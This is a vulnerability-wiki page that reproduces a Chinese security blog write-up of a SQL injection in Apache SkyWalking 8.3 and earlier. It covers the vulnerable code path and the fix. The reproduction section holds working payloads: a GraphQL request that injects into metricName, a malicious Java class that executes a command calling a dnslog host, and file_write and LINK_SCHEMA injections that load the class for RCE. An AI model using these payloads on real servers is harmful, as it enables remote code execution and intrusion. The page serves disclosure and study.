---
title: "Apache Skywalking 小于等于8.3 SQL注入分析复现"
product: "Apache SkyWalking"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: "CVE-2020-9483; CVE-2020-13921"
identifier_role: "reference"
prerequisites: "受影响queryLogs接口可达，使用H2且DB权限/文件写入与类加载满足；其他存储不可直接套用此RCE链"
verification_source: "https://github.com/vulhub/vulhub/blob/master/environments.toml"
source_url: "https://mp.weixin.qq.com/s/69JLJs1PW74U0sW5M6RjHw"
source_status: "recorded"
side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-71ae3a091f4004245b7437ae"
entity_id: "ve-71ae3a091f4004245b7437ae"
schema_version: "1"
---

# Apache Skywalking 小于等于8.3 SQL注入分析复现

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受影响queryLogs接口可达，使用H2且DB权限/文件写入与类加载满足；其他存储不可直接套用此RCE链
- 证据范围：SQL构造与DAO调用链有独立增量，frontmatter误把前序漏洞当当前编号。

### 已有来源支持的更正

- 8.3.0-sqli实验环境cve字段为空，不能作为9483绑定证据

### 本次正文校订

- 移除 1 组不含任何正文的空代码围栏；保留全部非空代码。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 9483/13921均在描述为前序不完全修复，不能据此赋9483为本篇主CVE；Vulhub当前manifest该环境cve为空
- HTTP请求、Java/Python源码被反引号包裹并压成单行，不能直接复现
- wget指向GitHub blob网页而非原始compose文件
- 多处成功结果/调用栈位置空白，无图片引用
- 一次静态初始化不重复不是简单双亲委派解释，应区分类缓存/初始化；换数据库只是阻断当前链不保证SQL注入修复
- 需明确8.4.0修复来源与8.3完整版本范围

### 核验来源

- https://github.com/vulhub/vulhub/blob/master/environments.toml

### 操作风险与资料使用

- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/69JLJs1PW74U0sW5M6RjHw)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****microworld****@Timeline Sec  
**

**本文字数：1429**

**阅读时长：4～5min**

**声明：请勿用作违法用途，否则后果自负**

  

**0x01 简介**  

  
  

Apache SkyWalking 是一款应用性能监控（APM）工具，对微服务、云原生和容器化应用提供自动化、高性能的监控方案。项目于 2015 年创建，并于 2017 年 12 月进入 Apache 孵化器。

  

Apache SkyWalking 提供了分布式追踪，服务网格（Service Mesh）遥感数据分析，指标聚合和可视化等多种能力。项目覆盖范围，从一个单纯的分布式追踪系统，扩展为一个可观测性分析平台（observability analysis platform）和应用性能监控管理系统。

  

**0x02 漏洞概述**  

  
  

基于CVE-2020-9483、CVE-2020-13921，由于修补并不完善，导致被发现还存在一处SQL注入漏洞。结合 h2 数据库（默认的数据库），可以导致 RCE 。

  

**0x03 影响版本**  

  
  

Apache Skywalking <= 8.3  

  

**0x04 环境搭建**  

  
  

利用vulhub的环境：  

```
`wget https://github.com/vulhub/vulhub/blob/master/skywalking/8.3.0-sqli/docker-compose.yml``docker-compose up -d`
```

  

然后访问8080端口，出现如下证明正常启动服务  

  



  

**0x05 漏洞复现**  

  
  

### **1、报错**  

对于vulhub提供的请求包，需要做些调整，请求如下：

```
`POST /graphql HTTP/1.1``Host: 192.168.18.154:8080``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9``Connection: close``Content-Type: application/json``Content-Length: 554``{` `"query":"query queryLogs($condition: LogQueryCondition) {` `queryLogs(condition: $condition) {` `total` `logs {` `serviceId` `serviceName` `isError` `content` `}` `}``}``",` `"variables":{` `"condition":{` `"metricName":"INFORMATION_SCHEMA.USERS union all select h2version())a where 1=? or 1=? or 1=? --",` `"endpointId":"1",` `"traceId":"1",` `"state":"ALL",` `"stateCode":"1",` `"paging":{` `"pageSize":10` `}` `}` `}``}`
```

  

成功报错：  

  



  

### **2、RCE**

总的来说分为两步：

（1）利用file_write写入一个类

编写恶意类：

```
`import java.io.IOException;``public class evil {` `static {` `try {` `Runtime.getRuntime().exec("ping 7hmkm6.dnslog.cn");` `} catch (IOException e) {` `e.printStackTrace();` `}` `}` `public static void main(String[] args) {` `}``}`
```

  

生成恶意类：

```
javac evil.java -target 1.6 -source 1.6
```

  

转为hex：

```
`with open("evil.class","rb") as f:` `a=f.read()` `print(a.hex())`
```

  

写入类：  

```
INFORMATION_SCHEMA.USERS union  all select file_write('[替换为自己的hex编码结果]','evil.class'))a where 1=? or 1=? or 1=? --
```

  

（2）利用LINK_SCHEMA调用该类

```
INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','evil','jdbc:h2:./test2','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --
```

  

有一点要记住：  

由于双亲委派机制，导致加载一次恶意类之后，再去使用 link_schema 加载的时候无法加载。所以在实际使用的时候，需要再上传一个其他名字的恶意类来加载。

  

**即每次加载类，要替换名称。**

  

成功获取结果：  

  



  

**0x06 漏洞分析**  

  
  

整个sql注入调用栈如下：  

  



  

当请求/graphql路由时，会交由  

org.apache.skywalking.oap.query.graphql的dopost处理  

  



  

dopost获取请求的json数据  

  



  

因为是向querylogs发起查询请求  

  



  

所以就走到  

org.apache.skywalking.oap.query.graphql.resolver的LogQuery.queryLogs的方法，返回时调用getQueryService().queryLogs方法  

  



  

走到org.apache.skywalking.oap.server.core.query的LogQueryService类的queryLogs方法  

  



  

通过调用getLogQueryDAO方法，获取一个ILogQueryDAO对象  

  



  

进行计算该表达式可知，返回一个h2client  

  



  

H2LogQueryDAO继承了ILogQueryDAO接口，所以最终走入H2LogQueryDAO类的queryLogs方法，拼接metricName  

  



  

然后执行查询

```
 `try (ResultSet resultSet = h2Client.executeQuery(connection, buildCountStatement(sql.toString()), parameters` `.toArray(new Object[0]))) {` `while (resultSet.next()) {` `logs.setTotal(resultSet.getInt("total"));` `}` `}`
```


buildCountStatement将sql语句拼入select count：  

  



  

我们执行h2Client.executeQuery()，便可以得到报错结果  

  



  

最后回到org.apache.skywalking.oap.query.graphql的GraphQLQueryHandler类，将查询结果以json形式返回  

  



  

**0x07 修复方式**  

  
  
  

1、升级Apache Skywalking 到最新的 v8.4.0 版本。

2、将默认h2数据库替换为其它支持的数据库。

  

```
**参考链接：**
```

https://www.anquanke.com/post/id/231753  

  

  



  



**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
